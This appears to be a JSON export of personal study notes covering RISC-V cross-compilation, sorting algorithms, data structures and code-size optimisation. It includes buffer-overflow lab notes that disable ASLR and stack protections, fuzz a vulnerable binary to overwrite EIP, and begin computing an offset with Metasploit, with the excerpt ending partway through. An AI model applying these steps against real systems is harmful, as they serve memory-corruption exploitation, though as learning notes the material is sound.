toolchain, we’d like to introduce an interesting naming convention that has been used for cross-compilers.\n\n### Compiler Naming Convention\nWhen you download the GCC toolchain, you'll find a `riscv64-unknown-elf-gcc` binary in the `bin` directory. This is the same GCC [compiler](notes/general/compilers.md) with inbuilt information of sysroot and platform. It is a convention to name [cross-compilers](notes/general/cross-compilation.md) that way. \n\nThe naming is typically using the `arch-vendor-os-abi` format. So, `riscv64-unknown-elf-gcc` means that this is a [cross-compiler](notes/general/cross-compilation.md) for RISC-V 64 bit, and tit will generate an `elf` binary, which can run on Linux machines for example. An excellent reference on naming convention can be found [here](http://web.eecs.umich.edu/~prabal/teaching/eecs373-f12/notes/notes-toolchain.pdf). In cases where a compiler's name doesn't have the target triplet, the `-dumpmachine` flag can be used to get that:\n\n```bash\n$ gcc -dumpmachine \nx86_64-linux-gnu\n```\n\nWith the `riscv64-unknown-elf-gcc` compiler handy, a file can then be compiled in the following ways:\n\n```bash\n$ riscv64-unknown-elf-gcc -O2 -o a.out hello.c\n$ riscv64-unknown-elf-gcc -O2 hello.c -mabi=lp64d -march=rv64ifd\n```\n\nThe `-march` flag is used to specify the target sub-architecture for which the assembly will be generated. The `-mabi` flag is used to specify data models. For more details on data models, refer to [](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models) section of 64-bit computing in Wikipedia.\n\nWith the [llvm toolchain](notes/general/llvm.md), the binary can be built similarly. Assuming [sysroot](notes/general/sysroot.md) is in the `riscv64-unknown-elf` directory:\n\n```bash\n$ clang test.c -c --sysroot riscv64-unknown-elf -target  \nriscv64-unknown-elf -march=rv64ifd\n```\n\nRISC-V applications can be launched on a device, a simulator, or an emulator.\n\n## Running the Applications on Spike Simulator\nOne of the most convenient ways to run small applications is to use the RISC-V simulator. The build and installation steps are fairly straightforward. For this, you need the following dependencies:\n\n1.  A Linux machine - building a Linux image on non-Linux machines is non-trivial, so it is recommended you have a Linux machine to begin with.\n2.  RISC-V toolchain: [https://github.com/riscv-software-src](https://courses.edx.org/xblock/One of the most convenient ways to run small applications is to use the RISC-V simulator. The build and installation steps are fairly straightforward. For this you need the following dependencies: A Linux machine. Building a Linux image on non-Linux machines is non-trivial so it is recommended you have a Linux machine to begin with. RISC-V toolchain (https://github.com/riscv-software-src) RISC-V simulator spike (https://github.com/riscv-software-src/riscv-isa-sim) RISC-V proxy kernel pk (https://github.com/riscv-software-src/riscv-pk)  The instructions to run a simple hello world app on the spike simulator is mentioned in their github README. To install the proxy kernel follow the instructions on their github README. For convenience, you can install both spike and pk in the same directory as the riscv64 toolchain directory by providing the path to toolchain directory as install prefix for both.)\n3.  RISC-V simulator spike: [https://github.com/riscv-software-src/riscv-isa-sim](https://github.com/riscv-software-src/riscv-isa-sim)\n4.  RISC-V proxy kernel pk: [https://github.com/riscv-software-src/riscv-pk](https://github.com/riscv-software-src/riscv-pk)\n\nThe instructions to run a simple `hello-world` app on the Spike simulator are mentioned in their GitHub [](https://github.com/riscv/riscv-isa-sim#compiling-and-running-a-simple-c-program). To install the proxy kernel, follow the instructions on their GitHub [README](https://github.com/riscv-software-src/riscv-pk). For convenience, you can install both `spike` and `pk` in the same directory as the `riscv64` toolchain directory by providing the path to the toolchain directory as install `prefix` for both.\n\n## Running Applications on an Emulator\nRunning a RISC-V application on an emulator gives you more flexibility, but the installation steps are more involved. In order to run a RISC-V application on an emulator, you need to have the following dependencies:\n\n1.  A Linux machine - building a Linux image on non-Linux machines is non-trivial, so it is recommended you have a Linux machine to begin with.\n2.  RISC-V toolchain: [https://github.com/riscv-software-src](https://courses.edx.org/xblock/Running an RISC-V application on an emulator gives you more flexibility but the installation steps are more involved. In order to run a RISC-V application on an emulator you need to have the following dependencies. A Linux machine. Building a Linux image on non-Linux machines is non-trivial so it is recommended you have a Linux machine to begin with. RISC-V toolchain (https://github.com/riscv-software-src) QEMU (git clone --depth 1 --branch v5.0.0 https://github.com/qemu/qemu) Linux (git clone --depth 1 --branch v5.4 https://github.com/torvalds/linux) Busybox (git clone --depth 1 git://git.busybox.net/busybox)  The branches listed above are suggested versions and that may change frequently. You can choose other branches as well. The documentation above may become stale if any of the dependencies have breaking changes. Check https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html to see the latest supported versions. If this documentation does not work, be sure to ask in the linux-riscv mailing list.  Build QEMU with the RISC-V target: cd qemu ./configure --target-list=riscv64-softmmu --prefix=/path/to/keep/qemu make -j $(nproc) make install  Build Linux for the RISC-V target: cd linux make ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- defconfig make ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- -j $(nproc)  Make sure to have the prefix of the cross compiler match from your toolchain. In the above example the gcc compiler is riscv64-unknown-linux-gnu-gcc so the CROSS_COMPILE flag is riscv64-unknown-linux-gnu-  Build the busybox  cd busybox CROSS_COMPILE=riscv64-unknown-linux-gnu- make defconfig CROSS_COMPILE=riscv64-unknown-linux-gnu- make -j $(nproc)  To run linux image on QEMU run sudo /path/to/keep/qemu/bin/qemu-system-riscv64 -nographic -machine virt /      -kernel /path/to/linux/image -append \"root=/dev/vda ro console=ttyS0\" /      -drive file=busybox,format=raw,id=hd0 /      -device virtio-blk-device,drive=hd0  You can also run bare metal app on QEMU like this /path/to/keep/qemu/bin/qemu-system-riscv64 -nographic -machine virt -kernel /path/to/binary -bios none  For additional QEMU configurations for RISC-V, checkout the official documentation. In addition to simulators and emulators, RISC-V applications can be run on virtual machines as well as commercially available development boards. Additional documentation to debug bare metal issues can be found here. You can install the RISC-V virtual machine as documented here.)\n3.  QEMU: `git clone --depth 1 --branch v5.0.0 https://github.com/qemu/qemu`\n4.  Linux: `git clone --depth 1 --branch v5.4 https://github.com/torvalds/linux`\n5.  Busybox: `git clone --depth 1 git://git.busybox.net/busybox`\n\nThe branches listed above are suggested versions and that may change frequently. You can choose other branches as well. The documentation above may become stale if any of the dependencies have breaking changes. Check the [Running 64- and 32-bit RISC-V Linux on QEMU documentation page](https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html) to see the latest supported versions. If this documentation does not work, be sure to ask in the [linux-riscv](http://lists.infradead.org/pipermail/linux-riscv/) mailing list.\n\n### Build QEMU with the RISC-V target:\n\n```bash\ncd qemu  \n./configure --target-list=riscv64-softmmu --prefix=/path/to/keep/qemu  \nmake -j $(nproc)  \nmake install\n```\n\n### Build Linux for the RISC-V target:\n\n```bash\ncd linux\nmake ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- defconfig \nmake ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- -j $(nproc)\n```\n\nMake sure to have the prefix of the [cross-compiler](notes/general/cross-compilation.md) match from your toolchain. In the above example, the GCC [compiler](notes/general/compilers.md) is `riscv64-unknown-linux-gnu-gcc` so the `CROSS_COMPILE` flag is `riscv64-unknown-linux-gnu-`\n\n### Build the busybox:\n\n```bash\ncd busybox\nCROSS_COMPILE=riscv64-unknown-linux-gnu- make defconfig \nCROSS_COMPILE=riscv64-unknown-linux-gnu- make -j $(nproc)\n```\n\n### To run the Linux image on QEMU, do:\n\n```bash\nsudo /path/to/keep/qemu/bin/qemu-system-riscv64 -nographic -machin  \nvirt   \n     -kernel /path/to/linux/image -append \"root=/dev/vda ro  \nconsole=ttyS0\" \\  \n     -drive file=busybox,format=raw,id=hd0 \\  \n     -device virtio-blk-device,drive=hd0\n```\n\n### You can also run the bare metal app on QEMU like this:\n\n```\n/path/to/keep/qemu/bin/qemu-system-riscv64 -nographic -machine virt  \n-kernel /path/to/binary -bios none\n```\n\nFor additional QEMU configurations for RISC-V, check out the [official documentation](https://wiki.qemu.org/Documentation/Platforms/RISCV). In addition to simulators and emulators, RISC-V applications can be run on virtual machines, as well as commercially available development boards. \n\nAdditional documentation to debug bare metal issues can be found [here](https://embeddedinn.xyz/articles/tutorial/Adding-a-custom-peripheral-to-QEMU/). You can install the RISC-V virtual machine as documented [here](https://wiki.debian.org/RISC-V).\n\n## References\n-   [Tech: Toolchain \u0026 Runtime Subcommittee mailing list](mailto:tech-toolchain-runtime@lists.riscv.org)\n-   [GCC Cross-Compiler](https://wiki.osdev.org/GCC_Cross-Compiler)\n-   [](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models)\n-   [](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models)\n-   [Running 64- and 32-bit RISC-V Linux on QEMU](https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html)\n-   [Qemu: Documentation/Platforms/RISCV](https://wiki.qemu.org/Documentation/Platforms/RISCV)\n-   [Debian - RISC-V Wiki](https://wiki.debian.org/RISC-V)\n\n### RISC-V Boards: \nThe [RISC-V Exchange](https://riscv.org/exchange/) page is a collection of available physical hardware in the RISC-V ecosystem. This list is curated by the community.\n\n### RISC-V Cores:   \nThe [RISC-V Exchange: Cores \u0026 SoCs](https://riscv.org/exchange/cores-socs/) page is a collection of available intellectual property (IP) cores and SoCs in the RISC-V ecosystem.\n\n### Toolchain and other hardware bringup software providers:\n-   [RISC-V Software Collaboration](https://github.com/riscv-collab)\n-   [sifive/freedom-tools](https://github.com/sifive/freedom-tools/releases)\n-   [lowRISC](https://github.com/lowRISC)\n-   [stnolting/riscv-gcc-prebuilt](https://github.com/stnolting/riscv-gcc-prebuilt)\n-   [SiFive/Software](https://www.sifive.com/software)",
    "lastmodified": "2022-11-24T12:21:01.193894386Z",
    "tags": null
  },
  "/notes/general/sets-and-maps": {
    "title": "Sets and Maps",
    "content": "# Sets and Maps\n---\n**Sets** are a collection of objects:\n  - They might be ordered or unordered.\n  - Two variants:\n      1. Single instance of any object.\n      2. Multiple instances.\n\n**Maps** associate a *value* or *values* with a *key*:\n  - They might be ordered or unordered.\n  - Two variants:\n      1. Single value per key.\n      2. Multiple values per key.\n\nExample:\n```c\n#include \u003cmap\u003e\n\nstd::map\u003csize_t, std::string\u003e map;\n\nmap[0] = \"Hello\";\nmap[1] = \"you\";\nmap[2] = \"there!\";\n```\n\nExample in C++:\n```cpp\n#include \u003cmap\u003e\n#include \u003cstring\u003e\nusing namespace std;\n\nint main() {\n  map\u003cint, string\u003e sample_map;\n  sample_map.insert(pair\u003cint, string\u003e(1, \"one\"));\n  sample_map.insert(pair\u003cint, string\u003e(2, \"two\"));\n\n  cout \u003c\u003c sample_map[1] \u003c\u003c \" \" \u003c\u003c sample_map[2] \u003c\u003c endl;\n}\n```\n\nAnother example but needs C++11:\n```cpp\n#include \u003ciostream\u003e\n#include \u003cmap\u003e\n#include \u003cstring\u003e\nusing namespace std;\n\nint main() {\n  map\u003cint, string\u003e sample_map { { 1, \"one\"}, { 2, \"two\" } };\n\n  cout \u003c\u003c sample_map[1] \u003c\u003c \" \" \u003c\u003c sample_map[2] \u003c\u003c endl;\n}\n```\n```ad-note\nC++ has great built-in support for these, C does not.\n```\n\n---\n### Resources\n[C++ Maps Explained](https://www.udacity.com/blog/2020/03/c-maps-explained.html)",
    "lastmodified": "2022-11-24T12:21:01.396396279Z",
    "tags": null
  },
  "/notes/general/shell-sort": {
    "title": "Shell Sort",
    "content": "# Shell Sort\n---\nShell sort adds one more loop outside [bubble sort](notes/general/bubble-sort.md).\n\nIt starts by sorting small overlapping subsets, then makes then smaller but by then the array is mostly sorted.\n\nIt is an **unstable** sort.\n\n## Shell Sort in C\n```c\nm = N;\n\ndo {\n  m = (m + 2) / 3;\n\n  for (i = 0; i \u003c m; i++) \n    for (k = i + m; k \u003c N; k += m) \n      for (j = k; (j \u003e 0) \u0026\u0026 (a[j] \u003c a[j - m]); j -= m) {\n        swap (\u0026(a[j]), \u0026(a[j - m])); \n        dump_array(a);     \n      }\n  }\nwhile (m != 1);\n```\n\n### Output:\n```bash\n16 16 0 14 9 11 10 2 3 4 1 11 8 17 14 5 11 12 15 16\n2 16 0 14 9 11 10 16 3 4 1 11 8 17 14 5 11 12 15 16\n2 16 0 14 9 11 10 14 3 4 1 11 8 17 16 5 11 12 15 16\n2 3 0 14 9 11 10 14 16 4 1 11 8 17 16 5 11 12 15 16\n2 3 0 14 9 11 10 14 5 4 1 11 8 17 16 16 11 12 15 16\n2 3 0 1 9 11 10 14 5 4 14 11 8 17 16 16 11 12 15 16\n2 3 0 1 9 11 10 14 5 4 12 11 8 17 16 16 11 14 15 16\n2 3 0 1 9 8 10 14 5 4 12 11 11 17 16 16 11 14 15 16\n1 3 0 2 9 8 10 14 5 4 12 11 11 17 16 16 11 14 15 16\n1 3 0 2 9 8 4 14 5 10 12 11 11 17 16 16 11 14 15 16\n1 3 0 2 9 8 4 14 5 10 12 11 11 17 16 15 11 14 16 16\n1 3 0 2 9 8 4 12 5 10 14 11 11 17 16 15 11 14 16 16\n1 3 0 2 9 8 4 12 5 10 14 11 11 11 16 15 17 14 16 16\n1 3 0 2 9 8 4 12 5 10 11 11 11 14 16 15 17 14 16 16\n1 3 0 2 9 8 4 11 5 10 12 11 11 14 16 15 17 14 16 16\n1 3 0 2 9 8 4 11 5 10 12 11 11 14 16 15 16 14 16 17\n1 3 0 2 9 5 4 11 8 10 12 11 11 14 16 15 16 14 16 17\n1 3 0 2 9 5 4 11 8 10 12 11 11 14 14 15 16 16 16 17\n1 0 3 2 9 5 4 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 3 2 9 5 4 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 9 5 4 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 5 9 4 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 5 4 9 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 9 11 8 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 9 8 11 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 8 9 11 10 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 8 9 10 11 12 11 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 8 9 10 11 11 12 11 14 14 15 16 16 16 17\n0 1 2 3 4 5 8 9 10 11 11 11 12 14 14 15 16 16 16 17\n```\n\n## Code Example\n```c\n/* Basic Shell's sort\n\n   Copyright (C) 2020 Embecosm Limited \u003cwww.embecosm.com\u003e\n   Contributor: Jeremy Bennett \u003cjeremy.bennett@embecosm.com\u003e\n   SPDX-License-Identifier: GPL-3.0-or-later */\n\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n\n#ifndef N\n#define N 20\n#endif\n\nvoid\npopulate (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    arr[i] = rand () % N;\n}\n\nvoid\nswap (int *a, int *b)\n{\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\n\nvoid\ndump_array (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    printf (\"%d \", arr[i]);\n\n  printf (\"\\n\");\n}\n\nint\nmain ()\n{\n  int a[N];\n  int i, j, k, m;\n\n  srand (561U);\n\n  populate (a);\n  dump_array (a);\n\n  m = N;\n\n  do\n    {\n      m = (m + 2) / 3;\n\n      for (i = 0; i \u003c m; i++)\n\tfor (k = i + m; k \u003c N; k += m)\n\t  for (j = k; (j \u003e i) \u0026\u0026 (a[j] \u003c a[j - m]); j -= m)\n\t    {\n\t      swap (\u0026(a[j]), \u0026(a[j - m]));\n\t      dump_array (a);\n\t    }\n    }\n  while (m != 1);\n\n  return 0;\n}\n\n/*\nLocal Variables:\nmode: C\nc-file-style: \"gnu\"\nEnd:\n*/\n```\n",
    "lastmodified": "2022-11-24T12:21:01.40281558Z",
    "tags": null
  },
  "/notes/general/so-prevention-techniques": {
    "title": "Stack-overflow Prevention Techniques and Mechanisms",
    "content": "# Stack-overflow Prevention Techniques and Mechanisms\n---\nSecurity mechanisms:\n\n- Canaries\n- Address Space Layout Randomisation ([](notes/general/cpu-architecture.md#ASLR))\n- Data Execution Prevention (DEP)\n\n## Canaries\nThey are known values written to the stack between buffer and control data to detect buffer overflows.\n\nIn case of a buffer overflow, the canary would be overwritten first and the operating system checks during runtime if the canary is present and unaltered.\n\n## Address Space Layout Randomisation (ASLR)\nIt makes it difficult to find target addresses in memory. The operating system uses it to hide the relevant memory addresses from us.\n\nTo disable:\n\n```bash\nsudo su\necho 0 \u003e /proc/sys/kernel/randomize_va_space\ncat /proc/sys/kernel/randomize_va_space\n0\n```\n\nThen we can compile into a 32-bit ELF binary:\n\n```bash\ngcc bow.c -o bow32 -fno-stack-protector -z execstack -m32\nfile bow32 | tr \",\" \"\\n\"\n```\n\n## Data Execution Prevention (DEP)\nIt is a feature in Windows XP and later in Service Pack 2 (SP2). It monitors programs during execution to ensure that they access memory areas cleanly.\n\nIt terminates the program if a program attempts to call or access the program code in an unauthorised manner.",
    "lastmodified": "2022-11-24T12:21:01.416166186Z",
    "tags": null
  },
  "/notes/general/sorting": {
    "title": "Sorting",
    "content": "# Sorting\n---\nThe sorting problem is a mapping from $x$ to $y$, where:\n- $x$ and $y$ are both **n** length real vectors (lists and/or arrays).\n- $y$ is a permutation of $x$ (different ordering).\n- $y_i \u003c y_{i+1}$ for all $i = 0, ..., n-1$.\n\nIt is the problem or reordering items of an array in a certain order.\n\n## Sorting methods\n- [Bubble Sort](notes/general/bubble-sort.md)\n- [Quicksort](notes/general/quicksort.md)\n- [Radix Sort](notes/university/radix-sort.md)\n- [Shell Sort](notes/general/shell-sort.md)\n- [Heapsort](notes/general/heapsort.md)\n- [Bucket Sort](notes/general/bucket-sort.md)\n- [Selection Sort](notes/university/selection-sort.md)\n\n## Stability\nA **stable** sort guarantee to preserve the ordering from a first sort, where the second sort finds the records to be equal.\n\nAn **unstable** sort does not make this guarantee. Unstable methods can all be made stable.\n\n### Examples\n- Stable methods:\n    - Merge sort and variants.\n    - Variants of [bubble sort](notes/general/bubble-sort.md).\n    - Insertion sort and variants.\n    - Variants on [bucket sort](notes/general/bucket-sort.md).\n        - Counting sort and variants.\n    - Timsort (merge/insertion variant, Python).\n\n## Comparison of Sorting Algorithms\n![Screenshot 2022-10-24 at 17.11.12](notes/images/Screenshot%202022-10-24%20at%2017.11.12.png)",
    "lastmodified": "2022-11-24T12:21:01.431650519Z",
    "tags": null
  },
  "/notes/general/source-code-optimisation": {
    "title": "Source Code Optimisation",
    "content": "# Source Code Optimisation\n---\nIn addition to [compiler](notes/general/compilers.md) optimisations, there are several software engineering techniques to reduce code size. These techniques take advantage of well-known software engineering methodologies and programming language features.\n\n## Code Refactoring\nMoving function definitions to the `.c/.cpp` file. When function definitions are put in header files, they get duplicated in every translation unit that includes the header file. Even though only one definition remains in the end (thanks to ODR), these functions may have been inlined in their callers and that extra code size will persist in the binary. So, it is a good idea to put function definitions in `.c/.cpp` files.\n\nIn addition to functions that were written by developers, there are [compiler](notes/general/compilers.md)-generated functions like constructors, destructors, operator overloads, etc. Even these functions can contribute to code size depending on the structure of the type and language rules. So, programmers can explicitly instantiate these methods in the `.cpp` file. One can either do a ‘default’ instantiation or an explicit instantiation. For example:\n\nIn `test.h`, the class is declared\n\n```cpp\nclass A {  \n  A(); \n  A(A const\u0026);\n  ~A();\n};\n```\n\nIn `test.cpp`, the definitions are instantiated:\n\n```cpp\nA::A() = default;  \nA(A const\u0026) = default;  \nA::~A() = default;\n```\n\nSimilar to how function definitions in header files contribute to code size, template functions do the same. It is however a non-trivial amount of work to reduce their overhead. It is often the case that some types are used more often than others. For the commonly used types, we can explicitly instantiate them in a `.cpp` file. For example:\n\nIn the `test.h` file, the template is defined:\n\n```cpp\ntemplate\u003cclass T\u003e  \nstruct  a {  \nvoid f(T t) { /* */ }  \n};\n```\n\nIn the `test.cpp` file, the template is explicitly instantiated:\n\n```cpp\ntemplate struct A\u003cint\u003e;\n```\n\nExplicit instantiations also save compile time as the instantiation happens once. For more ideas on source code optimisations, you can watch Aditya Kumar's presentation at the RISC-V Global Forum 2020: [_\"Code Size Compiler Optimisations and Techniques for Embedded Systems\"_](https://www.youtube.com/watch?v=6IuDWfuMEno).\n\n## Function Attributes\n\nFunction attributes that reduce inline potential can help reduce code size. For example:\n\n- `__attribute__((cold))`\n- `__attribute__((noinline))`\n\nNote that in some cases, inlining may reduce the code size. Especially, with tiny functions, inlining removes the function call overhead, which may be more than the size of the function body itself. It is advisable to use these attributes in limited cases as they affect the readability of programs.\n\n## Reducing Binary Size by Moving Evaluations Out of the Binary**\nWith a good knowledge of [compiler](notes/general/compilers.md) optimisations and requirements of the programming language, it is possible to move evaluations out of the binary. Some of the expressions can be evaluated at compile time, while some others can be delayed until runtime. Both approaches help reduce the binary size. Following are motivating examples:\n\nEarly evaluation: Using language features like `constexpr`, `static_assert` of C++ some of the expressions can be evaluated early for example:\n\n```cpp\nconstexpr auto gcd(int a, int b){  \n while (b != 0){  \n  auto t= b;  \n  b= a %b;  \n  a= t;  \n }  \n return a;  \n}\n\nint main(){  \n   int a= 11;  \n   int b= 121;  \n   int j= gcd(a,b);  \n   constexpr int i= gcd(10,12); // saves ‘2’ in the final assembly.  \n   return i + j;  \n}\n```\n\nCompiling the above program with `g++ -std=c++17 -fno-exceptions -S`:\n\n```assembly\nmain:  \n       mov     edx, 121  \n       mov     eax, 11  \n.L2:                 # inlined call to gcd(a, b)  \n       mov     ecx, edx  \n       cdq  \n       idiv    ecx  \n       mov     eax, ecx  \n       test    edx, edx  \n       jne     .L2  \n       add     eax, 2 # Precomputed value of gcd(10,12)  \n       ret\n```\n\nWe can see in the assembly that the second `gcd` has been evaluated at the compile time, but the first call to `gcd` has the entire code in it. This is because the second call to the `gcd` function is a `constexpr`. You can learn more about `constexpr` expressions on the [constexpr specifier web page](https://en.cppreference.com/w/cpp/language/constexp).\n\n## Simple Tricks to Find Dead Code in Binary\nIn any large project, there is likely dead code because of various reasons. Some of the dead code can be removed with simple tricks; for example:\n\n- Finding testing and debugging code shipped in production. It is non-trivial to find testing/debugging code by grepping the source code; however, searching in the binary provides a high signal/noise ratio. `nm` can be used to search symbol names in a binary. \n \n`nm \u003cBinary\u003e | grep -i \"test\\|debug\"`\n\n- Finding strings in the binary using the `strings` tool. As explained before, strings will print all the C-strings hardcoded in the binary. By looking at the strings we can investigate why a particular string ends up in the final binary.",
    "lastmodified": "2022-11-24T12:21:01.438964605Z",
    "tags": null
  },
  "/notes/general/stack": {
    "title": "Stack",
    "content": "# Stack\n---\n- Last in, first out (**LIFO**), simple [list](notes/general/lists.md) works well for this. \n    - Think of a stack of plates.\n    - The add and remove operations are called **push** and **pop**.\n\nAll insertions and deletions take place at one end.\n\n- To add an item to the stack you **push** it onto the top.\n- To remote an item from the top you **pop** it.\n\nIn the example below the top of the stack is on the right hand side:\n\n![Screenshot 2022-10-24 at 12.17.29](notes/images/Screenshot%202022-10-24%20at%2012.17.29.png)\n\n\n## In depth\nThe **stack** is a defined area in **RAM**. Usually in RAM's lower area above the global and static variables. The contents are accessed via the **stack pointer**, set to the upper end of the stack during initialisation. During execution, the stack grows down to the lower memory addresses.\n\nModern memory protections (**DEP**/**ASLR**) would prevent the damage cause by buffer overflows. DEP (Data Execution Prevention), marked regions of memory \"Read-Only\". The read-only memory regions is where some user-input is stored (Example: The Stack), so the idea behind DEP was to prevent users from uploading shellcode to memory and then setting the instruction pointer to the shellcode. Hackers started utilising ROP (Return Oriented Programming) to get around this, as it allowed them to upload the shellcode to an executable space and use existing calls to execute it. With ROP, the attacker needs to know the memory addresses where things are stored, so the defense against it was to implement ASLR (Address Space Layout Randomisation) which randomises where everything is stored making ROP more difficult.\n\nUsers can get around ASLR by leaking memory addresses, but this makes exploits less reliable and sometimes impossible. For example the [\"Freefloat FTP Server\"](https://www.exploit-db.com/exploits/46763) is trivial to exploit on Windows XP (before DEP/ASLR). However, if the application is ran on a modern Windows operating system the buffer overflow exists but it is currently non-trivial to exploit due to DEP/ASLR because there's no known way to leak memory addresses.\n\n### Stack Frames\nThe **base pointer** points to the beginning (base) of the stack in contrast to the **stack pointer**, which points to the top.\n\nAs the stack grows it is divided into regions called **Stack Frames**, which allocate the required memory in the stack for the corresponding function. It defines a frame with the beginning (**EBP**) and the end (**ESP**) that is pushed onto the stack when a function is called.\n\nSince the memory is built on a **LIFO** data structure, the first step is to store the **previous EBP** position on the stack, which can be restored after the function completes.\n\n#### Prologue\n```bash\n(gdb) disas bowfunc \n\nDump of assembler code for function bowfunc:\n   0x0000054d \u003c+0\u003e:\t    push   ebp       # \u003c---- 1. Stores previous EBP\n   0x0000054e \u003c+1\u003e:\t    mov    ebp,esp   # \u003c---- 2. Creates new Stack Frame\n   0x00000550 \u003c+3\u003e:\t    push   ebx\n   0x00000551 \u003c+4\u003e:\t    sub    esp,0x404 # \u003c---- 3. Moves ESP to the top\n   \u003c...SNIP...\u003e\n   0x00000580 \u003c+51\u003e:\tleave  \n   0x00000581 \u003c+52\u003e:\tret    \n```\n\n#### Epilogue\n```bash\n(gdb) disas bowfunc \n\nDump of assembler code for function bowfunc:\n   0x0000054d \u003c+0\u003e:\t    push   ebp       \n   0x0000054e \u003c+1\u003e:\t    mov    ebp,esp   \n   0x00000550 \u003c+3\u003e:\t    push   ebx\n   0x00000551 \u003c+4\u003e:\t    sub    esp,0x404 \n   \u003c...SNIP...\u003e\n   0x00000580 \u003c+51\u003e:\tleave  # \u003c----------------------\n   0x00000581 \u003c+52\u003e:\tret    # \u003c--- Leave stack frame\n```\n\n### Stack API\nA basic interface is:\n\n```java\npublic interface StringStack {\n  StringStack();\n  void push(String item);\n  String pop();\n  boolean isEmpty();\n  // optional\n  int size();\n}\n```\n\n\n\n## Applications\n- Reverse a string  \n- Undo mechanism in text editors  \n- Web pages navigation in a web browser  \n- Compilers – syntax evaluation",
    "lastmodified": "2022-11-24T12:21:01.452558756Z",
    "tags": null
  },
  "/notes/general/syntax-directed-translation": {
    "title": "Syntax Directed Translation",
    "content": "# Syntax Directed Translation\n---\nUse **attribute grammars**, where productions are supplemented with information to control semantic analysis and translation.\n\nAssociate attributes with each grammar symbol to describe its properties.\n\nFor each production add **semantic rules** (aka semantic actions) to compute attribute values.\n\ndig $\\rightarrow$ 0 { dig.val = 0 }\n           1 { dig.val = 1}\n           ...\n           9 { dig.val = 9}\n\n## Decorated Syntax of a Digit\n$int_1 \\rightarrow$ dig         { $int_1$.val = dig.val }\n        |    $int_2$dig  { $int_1$.val = $int_2$.val * 10 + dig.val }\n\n![decorated-parse-tree](notes/images/decorated-parse-tree.png)\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)\n",
    "lastmodified": "2022-11-24T12:21:01.479459167Z",
    "tags": null
  },
  "/notes/general/sysroot": {
    "title": "Sysroot",
    "content": "# Sysroot\n---\nAny [compiler](notes/general/compilers.md) needs to know where the standard headers, standard libraries, and the c-runtime are present. All of these are packaged together for each target (e.g., arm64, x86) in a directory called `sysroot`. When we compile a program, we need to pass the path to `sysroot` for a compiler to know where to look for standard headers during compilation, and where to look for common libraries (`libc`, `libstdc++`, etc.) during linkage.\n\nNormally, when we compile a program for the same machine, the compiler uses the standard headers available in `/usr/include` and libraries from `/usr/lib`. These paths are hardcoded in the compiler itself, so we never have to think about it. However, when building a custom compiler or when cross-compiling programs, we tell the compiler where the `sysroot` is by passing a flag (e.g. `gcc --sysroot=\"/path/to/arm64/sysroot/usr\" hello.cpp`). \n\nMost often, pre-packaged cross compilers come with a script/binary that has a `sysroot` path embedded into it (e.g., `aarch64-linux-gnu-gcc)` [g++-10-aarch64-linux-gnu (10.3.0-8ubuntu1cross1) package](10.3.0-8ubuntu1cross1)%20package).",
    "lastmodified": "2022-11-24T12:21:01.552656412Z",
    "tags": null
  },
  "/notes/general/take-control-eip": {
    "title": "Take Control of EIP",
    "content": "# Take Control of EIP\n---\nThis is part of a guide that you can find [here](notes/general/htb-stack-based-overflow-linux.md).\n\nWe need to get the **instruction pointer** (**EIP**) under control so we can tell it to which address to jump. So it should point to some **shellcode** for example.\n\nWe first check for overflow:\n\n```bash\nstudent@nix-bow:~$ gdb -q bow32\n\n(gdb) run $(python -c \"print '\\x55' * 1200\")\nStarting program: /home/student/bow/bow32 $(python -c \"print '\\x55' * 1200\")\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x55555555 in ?? ()\n```\n\nIf we insert 1200 \"`U`\"s (hex \"`55`\") as input, we can see from the register information that we have overwritten the `EIP`. As far as we know, the `EIP` points to the next instruction to be executed.\n\n```\n(gdb) info registers \n\neax            0x11\necx            0xffffd6c0-10560\nedx            0xffffd06f-12177\nebx            0x555555551431655765\nesp            0xffffcfd00xffffcfd0\nebp            0x555555550x55555555# \u003c---- EBP overwritten\nesi            0xf7fb5000-134524928\nedi            0x00\neip            0x555555550x55555555# \u003c---- EIP overwritten\neflags         0x10286[ PF SF IF RF ]\ncs             0x2335\nss             0x2b43\nds             0x2b43\nes             0x2b43\nfs             0x00\ngs             0x6399\n```\n\nIf we want to imagine the process visually, then the process looks something like this:\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)\n\nThis means that we have to write access to the EIP. This, in turn, allows specifying to which memory address the EIP should jump. However, to manipulate the register, we need an exact number of U's up to the EIP so that the following 4 bytes can be overwritten with our desired memory address.\n\n## Determine the Offset\nHow many bytes are needed to overwrite the buffer and how much space we have around our shellcode.\n\n- Create pattern:\n\n```bash\nPietra@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 \u003e pattern.txt\nPietra@htb[/htb]$ cat pattern.txt\n\nAa0Aa1Aa2Aa3Aa4Aa5...\u003cSNIP\u003e...Bn6Bn7Bn8Bn9\n```\n\nNow we replace our 1200 \"`U`\"s with the generated patterns and focus our attention again on the EIP.\n\n- Using generated pattern:\n\n```\n(gdb) run $(python -c \"print 